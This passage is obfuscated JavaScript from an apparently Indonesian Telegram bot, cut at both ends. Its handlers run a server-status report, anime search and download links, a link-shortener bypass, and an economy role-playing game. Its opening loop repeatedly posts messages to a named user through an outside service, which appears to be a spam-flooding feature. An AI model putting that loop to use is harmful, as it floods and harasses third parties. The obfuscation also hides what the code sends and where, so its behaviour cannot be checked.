_0x5a69d1=0x0;_0x5a69d1<_0xf35504;_0x5a69d1++){try{if(_0x1ce978[_0x240d04(0xa86)]('fIeXF',_0x240d04(0x21ec)))await _0x1ce978[_0x240d04(0x2e22)](_0x18dddb,_0x1ce978['FgNhq'],{'method':_0x1ce978['TMKIo'],'headers':{'accept':_0x1ce978[_0x240d04(0x17c5)],'content-type':_0x1ce978[_0x240d04(0x164b)]},'body':'username='+_0x1cbc06+_0x240d04(0x73c)+_0x1ce978[_0x240d04(0x221c)](encodeURIComponent,_0x482374)+('&deviceId='+'1')}),await _0x1ce978[_0x240d04(0x2b73)](_0x1eab64,0x3e8);else return _0x1ce978['svMKe'](_0x13815a,_0x240d04(0x23fe)+'ak\x20punya\x20p'+_0x240d04(0x2190)+_0x240d04(0x1ea3)+_0x240d04(0x241)+'ickaxe*.');}catch(_0x6b48a){console[_0x240d04(0x1e13)](_0x1ce978['Mgayv'],_0x6b48a);}}_0x1ce978[_0x240d04(0x1866)](_0x476bfb,_0x240d04(0xc3c)+'ngirim\x20'+_0xf35504+(_0x240d04(0x5af)+'@')+_0x1cbc06+'!');}break;case _0x1ce978[_0x240d04(0x1a6e)]:case _0x1ce978['VgpLA']:{const _0x5b89dc=performance[_0x240d04(0x104e)](),_0x8b6785=os[_0x240d04(0x28b1)](),_0x18d0b8=Math[_0x240d04(0xf02)](_0x1ce978['nmPUj'](_0x8b6785,0xe10)),_0x134240=Math[_0x240d04(0xf02)](_0x1ce978['dmUWa'](_0x1ce978[_0x240d04(0x552)](_0x8b6785,0xe10),0x3c)),_0x411b19=Math[_0x240d04(0xf02)](_0x8b6785%0x3c),_0x1126eb=_0x18d0b8+_0x240d04(0x2a6c)+_0x134240+'\x20menit\x20'+_0x411b19+_0x240d04(0x20ee);osu[_0x240d04(0x10db)](function(_0x4fd1d7){const _0x22453d=_0x240d04,_0x315e00=_0x1ce978[_0x22453d(0x8e7)](_0x1ce978[_0x22453d(0x4b4)](os[_0x22453d(0x1fa1)](),os[_0x22453d(0x2b6b)]()),os[_0x22453d(0x1fa1)]())*0x64,_0x3bef24=_0x1ce978['rnhhW'](performance[_0x22453d(0x104e)](),_0x5b89dc),_0xcce97d=_0x22453d(0x2366)+_0x22453d(0x29ba)+_0x22453d(0x60f)+_0x22453d(0x2017)+_0x1126eb+(_0x22453d(0x1fa5)+_0x22453d(0x2641))+_0x3bef24[_0x22453d(0x22f3)](0x2)+(_0x22453d(0x2c0c)+_0x22453d(0x114a))+_0x1ce978[_0x22453d(0x1ae3)](_0x4fd1d7,0x64)['toFixed'](0x2)+(_0x22453d(0x23b6)+_0x22453d(0x2e2))+_0x315e00[_0x22453d(0x22f3)](0x2)+'%';_0x1ce978[_0x22453d(0x21ae)](_0x476bfb,_0xcce97d);});}break;case _0x1ce978[_0x240d04(0x5f8)]:case _0x1ce978[_0x240d04(0x1fd2)]:{if(_0x240d04(0xf2a)!==_0x1ce978[_0x240d04(0x2923)])return _0x4313ea[_0x240d04(0x15e)](_0x33e6c0),_0x1ce978['PXLbd'](_0x4ddbdb,_0x1ce978[_0x240d04(0x2b4)]);else{if(!_0x33cfb1)return _0x476bfb(_0x1ce978[_0x240d04(0xada)]);_0x1ce978[_0x240d04(0xf9c)](_0x476bfb,lang[_0x240d04(0x172a)]||_0x1ce978[_0x240d04(0x2d3f)]);try{const _0x1b1beb=await _0x5b2ab4[_0x240d04(0x2149)](_0x33cfb1);if(!_0x1b1beb[_0x240d04(0x2b45)])return _0x476bfb(_0x240d04(0x1e2d)+'temukan.');let _0x2638ad=_0x240d04(0x27d)+_0x240d04(0x2af4)+_0x33cfb1+_0x240d04(0xa3d);_0x1b1beb[_0x240d04(0x728)](0x0,0x5)[_0x240d04(0x25f5)]((_0x486a91,_0x5afbac)=>{const _0x513910=_0x240d04;_0x2638ad+='*'+_0x1ce978[_0x513910(0x29ce)](_0x5afbac,0x1)+'.\x20'+_0x486a91[_0x513910(0x2016)]+_0x513910(0x12a5)+_0x486a91[_0x513910(0x1c54)]+'\x20|\x20'+_0x486a91[_0x513910(0x26bd)]+_0x513910(0xa67)+_0x486a91['url']+'\x0a\x0a';}),_0x1ce978[_0x240d04(0x2098)](_0x476bfb,_0x2638ad);}catch(_0x268fbb){console[_0x240d04(0x15e)](_0x268fbb),_0x1ce978[_0x240d04(0x2c6a)](_0x476bfb,_0x1ce978[_0x240d04(0x23cc)](_0x1ce978[_0x240d04(0x205e)],_0x268fbb[_0x240d04(0x960)]));}}}break;case _0x1ce978['hHZUm']:{if(!_0x483c03[0x0])return _0x1ce978[_0x240d04(0x1dfd)](_0x476bfb,_0x240d04(0x1eba)+'ekodetail\x20'+'https://ne'+_0x240d04(0x10d5)+_0x240d04(0xe50));const _0x4f124d=_0x483c03[0x0];_0x1ce978[_0x240d04(0x2b61)](_0x476bfb,_0x1ce978[_0x240d04(0x1ee8)]);try{if(_0x1ce978[_0x240d04(0x211)](_0x240d04(0x160d),_0x1ce978[_0x240d04(0xdc4)]))return this[_0xb7646b[_0x240d04(0xf02)](_0x1ce978[_0x240d04(0x15c4)](_0x2563f4['random'](),this[_0x240d04(0x2b45)]))];else{const _0x1573c1=await _0x5b2ab4['get'](_0x4f124d);let _0x4039ac='*'+(_0x1573c1[_0x240d04(0x2016)]||_0x1ce978[_0x240d04(0x2484)])+_0x240d04(0x139);_0x4039ac+='🗓️\x20Tanggal:'+'\x20'+(_0x1573c1[_0x240d04(0x26bd)]||'-')+'\x0a',_0x4039ac+=_0x240d04(0x918)+(_0x1573c1[_0x240d04(0x1c54)]||'-')+'\x0a',_0x4039ac+='🎭\x20Genre:\x20'+(_0x1573c1[_0x240d04(0x219)]?.[_0x240d04(0x86e)](',\x20')||'-')+'\x0a',_0x4039ac+=_0x240d04(0x2692)+(_0x1573c1['producer']||'-')+'\x0a\x0a',_0x4039ac+=_0x240d04(0x20e3)+':\x0a'+(_0x1573c1[_0x240d04(0x97f)]||'-')+'\x0a\x0a',_0x4039ac+=_0x240d04(0xe3b)+'wnload:*\x0a';const _0x2eeccc=_0x1573c1[_0x240d04(0x1a18)]||{},_0x4bf669=Object[_0x240d04(0x1adb)](_0x2eeccc);_0x1ce978['qoyNl'](_0x4bf669[_0x240d04(0x2b45)],0x0)?_0x1ce978['LqBsY'](_0x240d04(0x2ed6),_0x240d04(0x2ed6))?_0x4039ac+=_0x240d04(0x2690)+_0x240d04(0x6a8)+_0x240d04(0x2569)+_0x240d04(0x861):_0x12a425[_0x4ee504]&&_0x1ce978[_0x240d04(0x17f4)](_0xd9cd7f[_0x240d04(0x104e)](),_0x45435e[_0x3f66d0]['startedAt'])>=0x7530&&(_0x36532e(_0x240d04(0xb17)+'bis!\x20Jawab'+'an:\x20*'+_0x1ce978[_0x240d04(0x1f3)](_0x36c393,_0x25f38c)+'*'),delete _0x3532a0[_0x263116]):_0x4bf669[_0x240d04(0x25f5)](_0xd250a3=>{const _0x5193b1=_0x240d04,_0x4c0965={'SGQLd':function(_0x4d674b,_0x4d519d){const _0x57c0be=a0_0x1014;return _0x1ce978[_0x57c0be(0x5ba)](_0x4d674b,_0x4d519d);},'FZQAY':_0x1ce978[_0x5193b1(0x2a14)]};_0x4039ac+=_0x5193b1(0x1241)+_0xd250a3+'*\x0a',_0x2eeccc[_0xd250a3]['forEach'](_0x32a555=>{const _0x55b4ff=_0x5193b1;_0x4c0965[_0x55b4ff(0x1000)]===_0x4c0965['FZQAY']?_0x4039ac+='🔗\x20'+_0x32a555+'\x0a':(_0x2f9375[_0x55b4ff(0x15e)](_0x5466c2),_0x18db78(_0x4c0965[_0x55b4ff(0x252c)]('❌\x20',_0x28d3e8[_0x55b4ff(0x960)])));});}),_0x1573c1['thumb']&&_0x1573c1['thumb']['startsWith'](_0x1ce978[_0x240d04(0x2a8)])?await _0x23c0de[_0x240d04(0x2705)+_0x240d04(0x39a)]({'url':_0x1573c1[_0x240d04(0x1634)]},{'caption':_0x4039ac,'parse_mode':_0x1ce978[_0x240d04(0xa1b)]}):await _0x1ce978[_0x240d04(0x2ebd)](_0x476bfb,_0x4039ac);}}catch(_0x529d18){console[_0x240d04(0x15e)](_0x529d18),_0x1ce978[_0x240d04(0x439)](_0x476bfb,_0x1ce978['IgAUl'](_0x1ce978['ovbfM'],_0x529d18['message']));}}break;case _0x1ce978[_0x240d04(0x2cf8)]:case _0x1ce978[_0x240d04(0x17ef)]:{const _0x518291=_0x483c03[0x0];if(!_0x518291||!_0x518291[_0x240d04(0x55c)](_0x240d04(0x22df)))return _0x1ce978[_0x240d04(0x2d94)](_0x476bfb,'Contoh:\x20/o'+_0x240d04(0x277b)+'/ouo.press'+_0x240d04(0x2700));_0x1ce978[_0x240d04(0x66d)](_0x476bfb,_0x1ce978[_0x240d04(0xe7f)]);try{if(_0x1ce978[_0x240d04(0x8a6)](_0x1ce978[_0x240d04(0xc54)],_0x1ce978[_0x240d04(0x181c)]))_0x1adfe7['writeFileS'+_0x240d04(0xfd5)](_0x26f1a4,_0x2bb3ad[_0x240d04(0x1cf5)](_0x7078cf,null,0x2),_0x1ce978[_0x240d04(0x8b9)]),_0x140663[_0x240d04(0x1e13)](_0x1ce978['JNIeM']);else{const _0x21dbda=await _0x1ce978['NWaUO'](_0x5dc63f,_0x518291);_0x1ce978[_0x240d04(0x2644)](_0x476bfb,_0x240d04(0x26a4)+_0x240d04(0xf32)+_0x21dbda);}}catch(_0x1c7e29){if(_0x1ce978[_0x240d04(0x2de2)](_0x1ce978[_0x240d04(0x1e44)],_0x1ce978[_0x240d04(0x6e6)]))_0x1ce978[_0x240d04(0xd5c)](_0x476bfb,_0x1ce978[_0x240d04(0xe5d)](_0x1ce978[_0x240d04(0x17cf)],_0x1c7e29));else return _0x1ce978['DWrzO'](_0x1b5f68,_0x240d04(0x19fe)+_0x240d04(0x23c6)+_0x240d04(0x1813)+_0x240d04(0x33b)+'\x20nama.umur'+'\x20untuk\x20mul'+_0x240d04(0x2d8a));}}break;case _0x1ce978[_0x240d04(0x7b8)]:case _0x1ce978[_0x240d04(0x2be9)]:{if(_0x1ce978[_0x240d04(0x1559)](_0x1ce978[_0x240d04(0x903)],_0x1ce978[_0x240d04(0x903)])){const _0x32c4d8=(_0x483c03[0x0]||'')[_0x240d04(0x25f7)+'e'](),_0x48f9cf=_0x1ce978[_0x240d04(0x2aff)](_0x1ce978[_0x240d04(0x261)](0x5,0x3c),0x3e8),_0x34f333=Date[_0x240d04(0x104e)](),_0x3d779f=[_0x1ce978['wxHGj'],_0x240d04(0x3d1)+'k',_0x1ce978[_0x240d04(0x1a64)],_0x1ce978[_0x240d04(0xfe)],_0x1ce978[_0x240d04(0x787)]],_0x39718e=[_0x240d04(0x1172),_0x1ce978[_0x240d04(0x12c)],_0x1ce978[_0x240d04(0x1e26)],'tomat',_0x1ce978[_0x240d04(0x598)],_0x1ce978[_0x240d04(0x32b)]],_0x42a697=[_0x1ce978['uaLMW'],_0x1ce978['Mttiu'],_0x1ce978[_0x240d04(0x28ec)],_0x240d04(0x1990)+'ng'],_0x2841da=[_0x1ce978[_0x240d04(0x3ea)],_0x1ce978[_0x240d04(0x339)],_0x240d04(0x2833),_0x1ce978[_0x240d04(0x602)],_0x240d04(0x196b),_0x1ce978[_0x240d04(0x2967)]],_0x1b521d=[_0x1ce978[_0x240d04(0x210d)],_0x1ce978[_0x240d04(0x767)],_0x1ce978[_0x240d04(0xd55)],_0x240d04(0xef9)],_0x828e5=[_0x1ce978['ZUFLX'],_0x1ce978[_0x240d04(0x106f)]];try{const _0x27bbed=await _0x1ce978[_0x240d04(0x7a9)](_0x182219),_0x2e758a=_0x27bbed[_0xb65b97]||{'money':0x0,'lastkerja':0x0};if(!_0x2e758a||!_0x2e758a[_0x240d04(0x2eea)]||!_0x2e758a[_0x240d04(0x634)])return _0x1ce978[_0x240d04(0x9db)](_0x476bfb,_0x1ce978[_0x240d04(0x257a)]);if(_0x2e758a['jail']){if(_0x1ce978['qChQt'](_0x1ce978[_0x240d04(0x116f)],_0x240d04(0x8ed)))_0x1ce978['dYsSJ'](_0x13f5ba,_0x1e2cf8,_0x52fb6c['length'],_0x1ce978[_0x240d04(0x2597)]);else return _0x1ce978['gMmLg'](_0x476bfb,_0x1ce978[_0x240d04(0x17c4)]);}if(_0x1ce978['TwwrM'](_0x1ce978[_0x240d04(0x156b)](_0x34f333,_0x2e758a[_0x240d04(0x1a00)]),_0x48f9cf))return _0x1ce978['fLtHL'](_0x476bfb,_0x240d04(0xc5c)+_0x240d04(0x203a)+_0x240d04(0x1c3d)+_0x1ce978[_0x240d04(0x232)](_0x5f5dc7,_0x1ce978['eZoKw'](_0x2e758a[_0x240d04(0x1a00)]+_0x48f9cf,_0x34f333))+'\x20'+_0x1ce978[_0x240d04(0x13ea)](_0x4edd0b,_0x1ce978[_0x240d04(0x256b)]));const _0x209c1a=Math[_0x240d04(0xf02)](_0x1ce978[_0x240d04(0x1973)](Math[_0x240d04(0x24f1)](),0x249f0))+0x1388;let _0x2e83dd='';switch(_0x32c4d8){case _0x1ce978[_0x240d04(0x289d)]:_0x2e83dd=_0x240d04(0x6d3)+_0x240d04(0x43d)+_0x3d779f[Math[_0x240d04(0xf02)](Math[_0x240d04(0x24f1)]()*_0x3d779f[_0x240d04(0x2b45)])]+(_0x240d04(0xb72)+'atkan\x20*Rp\x20')+_0x209c1a[_0x240d04(0x17bf)+_0x240d04(0x1743)]()+'*\x20'+_0x1ce978['URFJP'](_0x4edd0b,_0x1ce978[_0x240d04(0x5bb)]);break;case _0x240d04(0x2827):_0x2e83dd=_0x240d04(0x1f8e)+_0x240d04(0x1478)+_0x39718e[Math['floor'](_0x1ce978['pBUJI'](Math[_0x240d04(0x24f1)](),_0x39718e[_0x240d04(0x2b45)]))]+(_0x240d04(0x780)+_0x240d04(0x1100))+_0x209c1a[_0x240d04(0x17bf)+_0x240d04(0x1743)]()+'*\x20'+_0x4edd0b(_0x240d04(0xd24));break;case _0x1ce978[_0x240d04(0x1640)]:_0x2e83dd=_0x240d04(0xce6)+_0x240d04(0x419)+_0x42a697[Math[_0x240d04(0xf02)](Math[_0x240d04(0x24f1)]()*_0x42a697[_0x240d04(0x2b45)])]+(_0x240d04(0x123e)+'atkan\x20*Rp\x20')+_0x209c1a[_0x240d04(0x17bf)+_0x240d04(0x1743)]()+'*\x20'+_0x4edd0b(_0x1ce978[_0x240d04(0x5bb)]);break;case _0x240d04(0x1a6a):_0x2e83dd=_0x240d04(0x2b7d)+_0x2841da[Math['floor'](_0x1ce978['Pnijd'](Math[_0x240d04(0x24f1)](),_0x2841da['length']))]+(_0x240d04(0x7fc)+_0x240d04(0x2c55)+_0x240d04(0x169e))+_0x209c1a['toLocaleSt'+_0x240d04(0x1743)]()+'*\x20'+_0x4edd0b(_0x1ce978[_0x240d04(0x5bb)]);break;case _0x1ce978['OOLIX']:_0x2e83dd='Memperbaik'+_0x240d04(0x1658)+_0x1b521d[Math[_0x240d04(0xf02)](_0x1ce978[_0x240d04(0x1af9)](Math[_0x240d04(0x24f1)](),_0x1b521d[_0x240d04(0x2b45)]))]+(_0x240d04(0x25e9)+_0x240d04(0x1100))+_0x209c1a[_0x240d04(0x17bf)+_0x240d04(0x1743)]()+'*\x20'+_0x1ce978['iaaiu'](_0x4edd0b,_0x1ce978['bsEjV']);break;case _0x1ce978[_0x240d04(0x2bb3)]:_0x2e83dd='Selesai\x20*'+_0x828e5[Math[_0x240d04(0xf02)](_0x1ce978[_0x240d04(0x1e1c)](Math[_0x240d04(0x24f1)](),_0x828e5['length']))]+(_0x240d04(0xb1a)+_0x240d04(0x1100))+_0x209c1a[_0x240d04(0x17bf)+_0x240d04(0x1743)]()+'*\x20'+_0x4edd0b(_0x1ce978[_0x240d04(0x5bb)]);break;default:return _0x476bfb(_0x240d04(0x1504)+_0x240d04(0x255e)+_0x240d04(0x2328)+_0x240d04(0xe76)+_0x240d04(0x11cc)+'Petani\x0a•\x20M'+'ontir\x0a•\x20Ku'+_0x240d04(0x2091)+_0x240d04(0x2ee6)+_0x1ec495+(_0x240d04(0x23be)+'ni*'));}return _0x2e758a[_0x240d04(0xd24)]+=_0x209c1a,_0x2e758a[_0x240d04(0x1a00)]=_0x34f333,_0x27bbed[_0xb65b97]=_0x2e758a,await _0x1ce978[_0x240d04(0x1695)](_0x961430,_0x27bbed),_0x476bfb(_0x2e83dd);}catch(_0x102675){if(_0x1ce978[_0x240d04(0x178f)]('HdjkS',_0x1ce978['GSpou']))return console[_0x240d04(0x15e)](_0x102675),_0x1ce978[_0x240d04(0x200d)](_0x476bfb,_0x240d04(0x54a)+_0x240d04(0x1e1b)+'at\x20mempros'+_0x240d04(0xbd6));else _0x189cf3[_0x240d04(0x15e)](_0x482e9e),_0x4e0297(_0x1ce978[_0x240d04(0x1aa1)]);}}else{const _0x1e61bc=_0x1ce978[_0x240d04(0x1982)](_0x1ce978[_0x240d04(0x2a0e)](_0x1ce978[_0x240d04(0x29ca)](_0x1ce978[_0x240d04(0x154e)](_0x240d04(0x244e)+_0x240d04(0x1b3b)+'\x0a\x0a',_0x240d04(0x1afe)+(_0x2c2ad6[_0x240d04(0x1a7c)]||0x0)+'\x0a')+(_0x240d04(0x28eb)+(_0x30de67[_0x240d04(0x2101)]||0x0)+'\x0a'),_0x240d04(0x2e87)+(_0x3c91d3[_0x240d04(0x7d9)]||0x0)+'\x0a')+(_0x240d04(0x822)+(_0x4fdce2[_0x240d04(0x196b)]||0x0)+'\x0a'),_0x240d04(0x15e7)+(_0x19147e['apel']||0x0)+'\x0a\x0a'),_0x240d04(0x2682)+'uah\x20sell*\x20'+'untuk\x20menj'+_0x240d04(0x7fd)+_0x240d04(0x2712));return _0x15dc0a(_0x1e61bc);}}break;case _0x1ce978[_0x240d04(0x1966)]:case _0x1ce978['bsEjV']:case _0x240d04(0x1b77):{if(_0x1ce978[_0x240d04(0x2e6)](_0x240d04(0x1783),_0x1ce978[_0x240d04(0xe9)]))return _0x1ce978[_0x240d04(0xeaa)](_0x28c38c,_0x1ce978['KdBjs']);else try{if(_0x1ce978[_0x240d04(0x332)](_0x1ce978[_0x240d04(0x336)],_0x1ce978[_0x240d04(0x15ae)])){const _0x58dc67=await _0x1ce978[_0x240d04(0x1177)](_0x182219),_0x3aa010=_0x58dc67[_0xb65b97]||{'money':0x0};if(!_0x3aa010||!_0x3aa010['nama']||!_0x3aa010[_0x240d04(0x634)])return _0x476bfb(_0x1ce978[_0x240d04(0x257a)]);_0x1ce978['OUjnc'](_0x476bfb,_0x240d04(0x1b1c)+_0x240d04(0x10a5)+_0x3aa010[_0x240d04(0xd24)][_0x240d04(0x17bf)+_0x240d04(0x1743)]()+'*');}else return _0x1ce978[_0x240d04(0x27a8)](_0x260ef6,_0x1ce978[_0x240d04(0x257a)]);}catch(_0x5ba8a7){if(_0x1ce978[_0x240d04(0x10fa)](_0x1ce978[_0x240d04(0x16c1)],_0x1ce978['wrUZA']))console['error'](_0x5ba8a7),_0x476bfb(_0x1ce978[_0x240d04(0x7c4)]);else return _0x1ce978[_0x240d04(0x1140)](_0x2d2b7d,_0x1ce978[_0x240d04(0x257a)]);}}break;case _0x1ce978[_0x240d04(0x1cd4)]:{if(_0x1ce978[_0x240d04(0x9ce)](_0x1ce978[_0x240d04(0xb73)],_0x240d04(0x2485))){const _0x5a8fb7=_0x46c2ef=>_0x46c2ef[Math[_0x240d04(0xf02)](Math[_0x240d04(0x24f1)]()*_0x46c2ef[_0x240d04(0x2b45)])],_0x1ca905=_0xe2250b=>{const _0x4d4eff=_0x240d04,_0x28277c={'NPLXT':function(_0x554bde,_0x277928){const _0x3130ed=a0_0x1014;return _0x1ce978[_0x3130ed(0x108a)](_0x554bde,_0x277928);},'PULjU':function(_0x3bd625,_0x4d43b5){return _0x3bd625+_0x4d43b5;},'PVyWR':_0x1ce978[_0x4d4eff(0x129b)]};if(_0x1ce978['FpNka'](_0x1ce978[_0x4d4eff(0x152f)],_0x1ce978['hyvyh']))_0x28277c[_0x4d4eff(0x1308)](_0x2df404,_0x28277c[_0x4d4eff(0x715)](_0x28277c[_0x4d4eff(0x24a9)],_0x19ba69['message']));else{let _0x1e2e33=Math['floor'](_0x1ce978[_0x4d4eff(0x200a)](_0xe2250b,0x36ee80)),_0x123812=_0x1ce978[_0x4d4eff(0x198f)](Math[_0x4d4eff(0xf02)](_0xe2250b/0xea60),0x3c),_0x2427c1=_0x1ce978[_0x4d4eff(0x185)](Math['floor'](_0xe2250b/0x3e8),0x3c);return[_0x1e2e33,_0x123812,_0x2427c1]['map'](_0x4ada7e=>_0x4ada7e[_0x4d4eff(0x2cb7)]()['padStart'](0x2,'0'))[_0x4d4eff(0x86e)](':');}};try{if(_0x1ce978[_0x240d04(0x1935)](_0x240d04(0x1702),_0x1ce978['fBUAg']))return _0x1ce978[_0x240d04(0x64a)](_0x3557ff,_0x1ce978['KdBjs']);else{const _0x2be2df=await _0x1ce978['RiOxT'](_0x182219),_0x4cea8a=_0x2be2df[_0xb65b97]||{'money':0x0,'lastbansos':0x0};if(!_0x4cea8a||!_0x4cea8a['nama']||!_0x4cea8a['umur']){if(_0x1ce978[_0x240d04(0x2537)](_0x1ce978[_0x240d04(0x2a77)],_0x1ce978[_0x240d04(0x231c)]))_0x1ce978[_0x240d04(0x1ba)](_0x4a79cd,_0x5638fb,_0x4bc53b[_0x240d04(0x2b45)],_0x1ce978['zjFKN']);else return _0x1ce978[_0x240d04(0x27ee)](_0x476bfb,_0x1ce978[_0x240d04(0x257a)]);}if(_0x4cea8a[_0x240d04(0x2344)])return _0x1ce978[_0x240d04(0xd35)](_0x476bfb,_0x1ce978[_0x240d04(0x17c4)]);_0x2be2df[_0xb65b97]=_0x4cea8a;const _0x313fb3=Date[_0x240d04(0x104e)](),_0x2fb869=_0x1ce978[_0x240d04(0x67e)](_0x1ce978[_0x240d04(0x2668)](0x5,0x3c),0x3e8),_0x52d48f=_0x1ce978[_0x240d04(0xf5c)](_0x1ce978[_0x240d04(0x1e14)](_0x4cea8a[_0x240d04(0x2942)],_0x2fb869),_0x313fb3);if(_0x1ce978[_0x240d04(0x10fb)](_0x4cea8a['money'],0x3e8))return _0x1ce978[_0x240d04(0xf84)](_0x476bfb,_0x1ce978[_0x240d04(0xd1a)]);if(_0x1ce978[_0x240d04(0x63c)](_0x52d48f,0x0))return _0x1ce978[_0x240d04(0x112e)](_0x476bfb,_0x240d04(0x1c3d)+_0x1ce978[_0x240d04(0x87a)](_0x1ca905,_0x52d48f)+(_0x240d04(0x641)+'encoba\x20ban'+_0x240d04(0xf79)));const _0xe262fe=Math['floor'](Math[_0x240d04(0x24f1)]()*0x65),_0x40c182=Math[_0x240d04(0xf02)](Math['random']()*0x65);let _0x27ae04='',_0x448cfb='';if(_0x1ce978['iGvTk'](_0x40c182,_0xe262fe))_0x4cea8a[_0x240d04(0xd24)]-=0x2dc6c0,_0x27ae04='*Kamu*\x20*te'+_0x240d04(0x2734)+_0x240d04(0x2b63)+_0x240d04(0x25cc)+'*\x20🕴️💰\x0a*Kamu'+_0x240d04(0x1936)+_0x240d04(0x29d2)+_0x240d04(0x1d05)+_0x240d04(0xca7),_0x448cfb=_0x1ce978['GfzEQ'];else{if(_0x40c182<_0xe262fe)_0x4cea8a['money']+=0x2dc6c0,_0x27ae04='*Kamu*\x20*be'+_0x240d04(0x2b5d)+'rupsi\x20dana'+'\x20*bansos*\x20'+_0x240d04(0x2ba3)+_0x240d04(0x15b0)+'n\x20*Rp\x203.00'+'0.000*\x20💸',_0x448cfb='https://te'+'legra.ph/f'+_0x240d04(0x193a)+_0x240d04(0x2568)+'236a7.jpg';else{if(_0x1ce978['AHqRZ']===_0x240d04(0x14ee)){_0x17ec1b=''+_0x3ad984[_0x240d04(0x22b7)](_0x32a411,_0x2fc1ba);for(let _0x4cd811=0x0;_0x1ce978[_0x240d04(0x8e4)](_0x4cd811,0xfa);_0x4cd811++){_0x5ab393+=_0x1ce978[_0x240d04(0x1bb3)](_0x1ce978[_0x240d04(0x16d4)]+_0x14e3d9[_0x4cd811],'`\x0a');}_0x1ce978[_0x240d04(0x1fed)](_0x26f01d,_0x28b79d);}else _0x27ae04=_0x240d04(0x2a15)+_0x240d04(0x2e3)+'sos*\x20tapi\x20'+_0x240d04(0x2730)+_0x240d04(0x240e)+_0x240d04(0x1c96)+_0x240d04(0x306)+_0x240d04(0xa06)+'ap!',_0x448cfb='';}}return _0x4cea8a['lastbansos']=_0x313fb3,await _0x961430(_0x2be2df),_0x448cfb?await _0x23c0de['replyWithP'+'hoto']({'imageUrl':_0x448cfb},{'caption':_0x27ae04}):_0x1ce978['xDJYV'](_0x476bfb,_0x27ae04);}}catch(_0x1cc421){if(_0x1ce978['IjVpK'](_0x240d04(0x1e78),_0x1ce978[_0x240d04(0x19c8)]))return console[_0x240d04(0x15e)](_0x1cc421),_0x1ce978['rqaaO'](_0x476bfb,_0x240d04(0x54a)+'salahan\x20sa'+_0x240d04(0x1ce)+_0x240d04(0x1517));else _0x20aee5(_0x240d04(0x1736)+_0x240d04(0x690)+'akan\x20cek\x20a'+_0x240d04(0xe6d)+_0x240d04(0x2bdf)+'a_');}}else{const _0x1ee29b={'dmArT':_0x1ce978[_0x240d04(0x4a6)],'WSfZd':_0x1ce978[_0x240d04(0xa61)],'HkqAX':function(_0x358005,_0xf75b82){return _0x1ce978['pVKSY'](_0x358005,_0xf75b82);},'YUgRQ':function(_0x3d90d0,_0xa6da49){const _0x3ac921=_0x240d04;return _0x1ce978[_0x3ac921(0x2860)](_0x3d90d0,_0xa6da49);}};if(!_0x2dba4f)throw _0x1ce978[_0x240d04(0x7eb)];let _0x34f11f=_0x317330;_0x594f0b[_0x240d04(0x1a6)]({'headers':{'content-type':_0x240d04(0x2724)+_0x240d04(0x2345)+'rm-urlenco'+'ded'},'url':_0x1ce978[_0x240d04(0x2a8a)](_0x1ce978[_0x240d04(0x2109)](_0x240d04(0x7a2)+_0x240d04(0x1fc2)+_0x240d04(0x1e03)+_0x240d04(0x1c5c)+_0x240d04(0x142c),_0x34f11f),_0x1ce978['SoKmw'])},function(_0x11e1bd,_0x37ae11,_0x241a51){const _0x2a004e=_0x240d04;let _0x1d4b65=_0x560e69[_0x2a004e(0x286b)](_0x241a51);var _0x4570d1=_0x1d4b65[_0x2a004e(0x7b1)]()[_0x2a004e(0x1c39)](_0x1ee29b['dmArT'])[0x1],_0x33d896=_0x4570d1[_0x2a004e(0x1c39)](_0x1ee29b['WSfZd'])[0x1],_0x2f650c=_0x4570d1[_0x2a004e(0x1ba2)](_0x33d896,'\x20'),_0x5576ba=_0x2f650c[_0x2a004e(0x1ba2)](/<br\s*[\/]?>/gi,'\x0a'),_0x1feeb3=_0x5576ba[_0x2a004e(0x1ba2)](/<[^>]*>?/gm,'');_0x3c6566[_0x2a004e(0x1e13)](_0x1ee29b['HkqAX']('',_0x1feeb3)),_0x1ee29b[_0x2a004e(0x4d8)](_0x39f3e7,_0x2a004e(0x28ab)+_0x2a004e(0x973)+_0x34f11f+(_0x2a004e(0x45c)+'----------'+_0x2a004e(0x2178)+'----------'+_0x2a004e(0x2657))+_0x34f11f+'\x20'+_0x1feeb3+(_0x2a004e(0x1473)+_0x2a004e(0x2178)+_0x2a004e(0x2178)+_0x2a004e(0xdf5)));});}}break;case _0x240d04(0x22f0):{const _0x21f988=_0x1c4d5e=>{const _0xaa8a90=_0x240d04;let _0x2b5118=Math[_0xaa8a90(0xf02)](_0x1ce978[_0xaa8a90(0x4da)](_0x1c4d5e,0x36ee80)),_0x151364=Math[_0xaa8a90(0xf02)](_0x1ce978['ZXsLX'](_0x1c4d5e,0xea60))%0x3c,_0x1bf2b3=_0x1ce978[_0xaa8a90(0x1f9c)](Math[_0xaa8a90(0xf02)](_0x1ce978[_0xaa8a90(0xb8a)](_0x1c4d5e,0x3e8)),0x3c);return[_0x2b5118,_0x151364,_0x1bf2b3][_0xaa8a90(0x16e6)](_0x5f208=>_0x5f208[_0xaa8a90(0x2cb7)]()['padStart'](0x2,'0'))['join'](':');};try{const _0x3deda4=await _0x1ce978[_0x240d04(0x50b)](_0x182219),_0x24bd8f=_0x3deda4[_0xb65b97]||{'money':0x0,'exp':0x0,'ojekk':0x0,'lastmisi':0x0};if(!_0x24bd8f||!_0x24bd8f[_0x240d04(0x2eea)]||!_0x24bd8f[_0x240d04(0x634)])return _0x476bfb(_0x1ce978[_0x240d04(0x257a)]);_0x24bd8f[_0x240d04(0x25c4)]=_0x24bd8f[_0x240d04(0x25c4)]||0x0;if(_0x24bd8f[_0x240d04(0x2344)])return _0x476bfb(_0x1ce978[_0x240d04(0x17c4)]);_0x3deda4[_0xb65b97]=_0x24bd8f;const _0x5c6447=Date[_0x240d04(0x104e)](),_0x5d1195=_0x1ce978[_0x240d04(0x26c4)](0x3c,0x3c)*0x3e8,_0x5ec953=_0x24bd8f['lastmisi']+_0x5d1195-_0x5c6447;global['misi']=global[_0x240d04(0xbe8)]||{};if(global['misi'][_0xb65b97])return _0x1ce978['mngLJ'](_0x1ce978[_0x240d04(0x16f4)],_0x1ce978[_0x240d04(0x16f4)])?_0x1ce978[_0x240d04(0x2a5a)](_0x2d8d8d,_0x1ce978[_0x240d04(0x24a8)]):_0x1ce978[_0x240d04(0xf34)](_0x476bfb,'Selesaikan'+_0x240d04(0x2d5d)+global[_0x240d04(0xbe8)][_0xb65b97][0x0]+_0x240d04(0x2fb));if(_0x1ce978[_0x240d04(0xff1)](_0x5ec953,0x0))return 